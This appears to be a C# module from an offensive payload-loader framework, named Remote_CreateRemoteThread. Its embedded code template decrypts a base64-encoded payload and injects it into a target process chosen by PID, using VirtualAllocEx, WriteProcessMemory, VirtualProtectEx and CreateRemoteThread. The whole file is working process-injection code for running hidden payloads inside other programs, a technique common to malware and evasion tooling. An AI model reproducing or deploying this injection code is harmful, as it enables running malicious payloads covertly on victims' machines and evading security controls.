using Models;

namespace Modules
{
    public class Remote_CreateRemoteThread : Models.Module
    {
        public override string Name => "Remote_CreateRemoteThread";

        public override string Description => "Execute in Remote process via CreateRemoteThread method";

        public override Types Type => Types.Remote;

        public override string Header => Models.Defaults.Header;

        public override string Footer => Models.Defaults.Footer;

        public override string Core => @"
      byte[] payload = Decrypt(b64, key, iv);

         int pid = int.Parse(args[0]); // No Cheking on arg
         var target = Process.GetProcessById(pid);
         var baseAddress = Utils.Kernel32.VirtualAllocEx(target.Handle,
                 IntPtr.Zero,
                 payload.Length,
                 Utils.Kernel32.AllocationType.Commit | Utils.Kernel32.AllocationType.Reserve,
                 Utils.Kernel32.MemoryProtection.ReadWrite);

         Utils.Kernel32.WriteProcessMemory(
             target.Handle,
             baseAddress,
             payload,
             payload.Length,
             out _);

         Utils.Kernel32.VirtualProtectEx(
             target.Handle,
             baseAddress,
             payload.Length,
             Utils.Kernel32.MemoryProtection.ExecuteRead,
             out _);

         Utils.Kernel32.CreateRemoteThread(
             target.Handle,
             IntPtr.Zero,
             0,
             baseAddress,
             IntPtr.Zero,
             0,
             out var threadId);

         // return threadId != IntPtr.Zero;
    }";
    }
}
